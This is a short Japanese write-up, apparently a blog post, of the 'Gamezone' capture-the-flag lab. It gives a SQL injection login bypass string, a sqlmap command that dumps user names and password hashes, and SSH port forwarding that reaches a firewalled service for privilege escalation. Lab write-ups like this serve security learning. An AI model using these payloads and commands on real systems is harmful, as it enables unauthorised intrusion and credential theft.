---
title: "Gamezone"
date: 2024-03-17T04:41:11+09:00
draft: false
---

### user

- SQLi をする
  - ユーザ名が分かってないので，ユーザ名のところで ```' or 1=1 -- -```
- portal.php ではレビューのデータベースを検索する
  - リクエストを burp でキャッチ
  - ```sqlmap -r request.txt --dbms=mysql --dump```
  - ハッシュパスワードとユーザ名がもらえる
  - ssh できるようになる

### root

- ssh ポートフォワーディング
  - ```ss -tulpn``` コマンドで 10000 ポートに外部から入る通信がファイアウォールによってブロックされていることが分かる
  - ```ssh -L 10000:localhost:10000 <username>@<ip>```
    - local で実行する
    - ```localhost:10000``` への通信を，```<username>@<ip>``` を経由して ```localhost:10000``` に転送する
  - SSHトンネル
    - ```ssh -L 127.0.0.1:8080:example.org:80 ssh-server```
    - なので，今回の始点と終点は ```localhost``` で，ssh-server が agent47 のサーバ
